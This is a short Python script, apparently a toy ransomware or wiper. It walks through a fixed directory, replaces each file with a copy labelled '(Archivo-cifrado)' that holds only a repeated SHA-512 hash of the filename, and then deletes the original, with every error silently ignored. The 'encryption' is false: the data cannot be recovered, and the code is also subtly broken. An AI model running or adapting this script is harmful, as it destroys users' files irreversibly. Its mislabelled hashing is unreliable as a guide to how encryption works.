import hashlib
import os

path = '/root/Desktop/test'

for archivos in os.listdir(path):

    os.chdir(path)
    try:
        with open(archivos, 'rb') as r:

            files = r.read()

            encrypt = hashlib.sha512(archivos).hexdigest()

            new_file = '(Archivo-cifrado)'+os.path.basename(archivos)
            with open(new_file, 'wb') as n:

                n.write(encrypt*0xFF)

                n.close()

                n.close()

                os.remove(archivos)
    except:
	    pass

